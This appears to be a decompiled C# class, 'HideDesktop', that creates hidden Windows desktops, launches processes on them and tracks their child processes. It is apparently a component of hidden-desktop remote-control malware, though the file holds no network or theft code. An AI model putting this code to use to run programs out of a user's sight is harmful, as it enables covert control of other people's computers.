using System;
using System.Collections.Specialized;
using System.Management;
using System.Runtime.InteropServices;
using Methods.Native;

// Token: 0x02000003 RID: 3
public class HideDesktop
{
	// Token: 0x0600001D RID: 29
	[DllImport("kernel32.dll")]
	private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref HandelNative.STARTUPINFO lpStartupInfo, ref HandelNative.PROCESS_INFORMATION lpProcessInformation);

	// Token: 0x0600001E RID: 30
	[DllImport("user32.dll")]
	public static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice, IntPtr pDevmode, int dwFlags, long dwDesiredAccess, IntPtr lpsa);

	// Token: 0x0600001F RID: 31
	[DllImport("user32.dll")]
	public static extern IntPtr OpenDesktop(string lpszDesktop, int dwFlags, bool fInherit, long dwDesiredAccess);

	// Token: 0x06000020 RID: 32 RVA: 0x000028F8 File Offset: 0x00000AF8
	public static HideDesktop OpenDesktop(string name)
	{
		HideDesktop hideDesktop = new HideDesktop();
		bool flag = hideDesktop.Open(name);
		bool flag2 = !flag;
		bool flag3 = flag2;
		HideDesktop result;
		if (flag3)
		{
			result = null;
		}
		else
		{
			result = hideDesktop;
		}
		return result;
	}

	// Token: 0x06000021 RID: 33 RVA: 0x00002934 File Offset: 0x00000B34
	public static HideDesktop CreateDesktop(string name)
	{
		HideDesktop hideDesktop = new HideDesktop();
		bool flag = hideDesktop.Create(name);
		bool flag2 = !flag;
		bool flag3 = flag2;
		HideDesktop result;
		if (flag3)
		{
			result = null;
		}
		else
		{
			result = hideDesktop;
		}
		return result;
	}

	// Token: 0x06000022 RID: 34 RVA: 0x00002970 File Offset: 0x00000B70
	public static bool CreateProcess(string path, string desktop, bool bAppName)
	{
		bool flag = !HideDesktop.Exists(desktop);
		bool flag2 = flag;
		bool result;
		if (flag2)
		{
			result = false;
		}
		else
		{
			HideDesktop hideDesktop = HideDesktop.OpenDesktop(desktop);
			result = hideDesktop.CreateProcess(path, bAppName);
		}
		return result;
	}

	// Token: 0x06000023 RID: 35 RVA: 0x000029AC File Offset: 0x00000BAC
	public static void CollectProcessAndChildren(int pid)
	{
		bool flag = pid == 0;
		bool flag2 = !flag;
		if (flag2)
		{
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * From Win32_Process Where ParentProcessID=" + pid.ToString());
			ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get();
			foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				HideDesktop.CollectProcessAndChildren(Convert.ToInt32(managementObject["ProcessID"]));
			}
			HandelNative.m_lstProcessID.Add(pid);
		}
	}

	// Token: 0x06000024 RID: 36 RVA: 0x00002A54 File Offset: 0x00000C54
	public bool CreateProcess(string path, bool bAppName)
	{
		this.CheckDisposed();
		bool flag = !this.IsOpen;
		bool flag2 = flag;
		bool result;
		if (flag2)
		{
			result = false;
		}
		else
		{
			HandelNative.STARTUPINFO structure = default(HandelNative.STARTUPINFO);
			structure.cb = Marshal.SizeOf<HandelNative.STARTUPINFO>(structure);
			structure.lpDesktop = this.Desktop_name;
			HandelNative.PROCESS_INFORMATION process_INFORMATION = default(HandelNative.PROCESS_INFORMATION);
			bool flag3 = !bAppName;
			bool flag4 = flag3;
			bool flag5;
			if (flag4)
			{
				flag5 = HideDesktop.CreateProcess(null, path, IntPtr.Zero, IntPtr.Zero, false, 32, IntPtr.Zero, null, ref structure, ref process_INFORMATION);
			}
			else
			{
				flag5 = HideDesktop.CreateProcess(path, null, IntPtr.Zero, IntPtr.Zero, false, 32, IntPtr.Zero, null, ref structure, ref process_INFORMATION);
			}
			HideDesktop.CollectProcessAndChildren(process_INFORMATION.dwProcessId);
			result = flag5;
		}
		return result;
	}

	// Token: 0x06000025 RID: 37 RVA: 0x00002B18 File Offset: 0x00000D18
	public static bool Load(HideDesktop desktop)
	{
		return desktop.IsOpen && HandelNative.SetThreadDesktop(desktop.DesktopHandle);
	}

	// Token: 0x17000001 RID: 1
	// (get) Token: 0x06000026 RID: 38 RVA: 0x00002B48 File Offset: 0x00000D48
	public bool IsOpen
	{
		get
		{
			return this.HDesktop != IntPtr.Zero;
		}
	}

	// Token: 0x17000002 RID: 2
	// (get) Token: 0x06000027 RID: 39 RVA: 0x00002B6C File Offset: 0x00000D6C
	public IntPtr DesktopHandle
	{
		get
		{
			return this.HDesktop;
		}
	}

	// Token: 0x06000028 RID: 40 RVA: 0x00002B84 File Offset: 0x00000D84
	public bool Create(string name)
	{
		this.CheckDisposed();
		bool flag = this.HDesktop != IntPtr.Zero;
		bool flag2 = flag;
		if (flag2)
		{
			bool flag3 = !this.Close();
			bool flag4 = flag3;
			if (flag4)
			{
				return false;
			}
		}
		bool flag5 = HideDesktop.Exists(name);
		bool flag6 = flag5;
		bool result;
		if (flag6)
		{
			result = this.Open(name);
		}
		else
		{
			this.HDesktop = HideDesktop.CreateDesktop(name, IntPtr.Zero, IntPtr.Zero, 0, 511L, IntPtr.Zero);
			this.Desktop_name = name;
			bool flag7 = this.HDesktop == IntPtr.Zero;
			result = !flag7;
		}
		return result;
	}

	// Token: 0x06000029 RID: 41 RVA: 0x00002C30 File Offset: 0x00000E30
	public bool Open(string name)
	{
		this.CheckDisposed();
		bool flag = this.HDesktop != IntPtr.Zero;
		bool flag2 = flag;
		if (flag2)
		{
			bool flag3 = !this.Close();
			bool flag4 = flag3;
			if (flag4)
			{
				return false;
			}
		}
		this.HDesktop = HideDesktop.OpenDesktop(name, 0, false, 511L);
		bool flag5 = this.HDesktop == IntPtr.Zero;
		bool flag6 = flag5;
		bool result;
		if (flag6)
		{
			result = false;
		}
		else
		{
			this.Desktop_name = name;
			result = true;
		}
		return result;
	}

	// Token: 0x0600002A RID: 42 RVA: 0x00002CBC File Offset: 0x00000EBC
	private void CheckDisposed()
	{
		bool disposed_Boolean = this.Disposed_Boolean;
		bool flag = disposed_Boolean;
		if (flag)
		{
			throw new ObjectDisposedException("");
		}
	}

	// Token: 0x0600002B RID: 43 RVA: 0x00002CE4 File Offset: 0x00000EE4
	public bool Close()
	{
		this.CheckDisposed();
		bool flag = this.HDesktop != IntPtr.Zero;
		bool flag2 = flag;
		bool result;
		if (flag2)
		{
			bool flag3 = HandelNative.CloseDesktop(this.DesktopHandle);
			bool flag4 = flag3;
			bool flag5 = flag4;
			if (flag5)
			{
				this.HDesktop = IntPtr.Zero;
				this.Desktop_name = string.Empty;
			}
			result = flag3;
		}
		else
		{
			result = true;
		}
		return result;
	}

	// Token: 0x0600002C RID: 44 RVA: 0x00002D50 File Offset: 0x00000F50
	public static bool Exists(string name)
	{
		return HideDesktop.Exists(name, false);
	}

	// Token: 0x0600002D RID: 45 RVA: 0x00002D6C File Offset: 0x00000F6C
	public static bool Exists(string name, bool caseInsensitive)
	{
		string[] desktops = HideDesktop.GetDesktops();
		foreach (string text in desktops)
		{
			if (caseInsensitive)
			{
				bool flag = object.Equals(text.ToLower(), name.ToLower());
				bool flag2 = flag;
				if (flag2)
				{
					return true;
				}
			}
			else
			{
				bool flag3 = object.Equals(text, name);
				bool flag4 = flag3;
				if (flag4)
				{
					return true;
				}
			}
		}
		return false;
	}

	// Token: 0x0600002E RID: 46 RVA: 0x00002DE4 File Offset: 0x00000FE4
	private static bool DesktopProc(string lpszDesktop, IntPtr lParam)
	{
		HideDesktop.StringCollection.Add(lpszDesktop);
		return true;
	}

	// Token: 0x0600002F RID: 47 RVA: 0x00002E04 File Offset: 0x00001004
	public static string[] GetDesktops()
	{
		IntPtr processWindowStation = HandelNative.GetProcessWindowStation();
		bool flag = processWindowStation == IntPtr.Zero;
		bool flag2 = flag;
		string[] result;
		if (flag2)
		{
			result = new string[0];
		}
		else
		{
			StringCollection stringCollection = HideDesktop.Valua<StringCollection>(ref HideDesktop.StringCollection, new StringCollection());
			StringCollection obj = stringCollection;
			string[] array;
			lock (obj)
			{
				bool flag4 = HandelNative.EnumDesktops(processWindowStation, new HandelNative.EnumDesktopProc(HideDesktop.DesktopProc), IntPtr.Zero);
				bool flag5 = !flag4;
				bool flag6 = flag5;
				if (flag6)
				{
					return new string[0];
				}
				array = new string[HideDesktop.StringCollection.Count];
				int i = 0;
				int num = array.Length - 1;
				while (i <= num)
				{
					array[i] = HideDesktop.StringCollection[i];
					i++;
				}
			}
			result = array;
		}
		return result;
	}

	// Token: 0x06000030 RID: 48 RVA: 0x00002F00 File Offset: 0x00001100
	public static T Valua<T>(ref T target, T value)
	{
		target = value;
		return value;
	}

	// Token: 0x04000014 RID: 20
	private string Desktop_name;

	// Token: 0x04000015 RID: 21
	private bool Disposed_Boolean;

	// Token: 0x04000016 RID: 22
	private static StringCollection StringCollection;

	// Token: 0x04000017 RID: 23
	private IntPtr HDesktop;
}
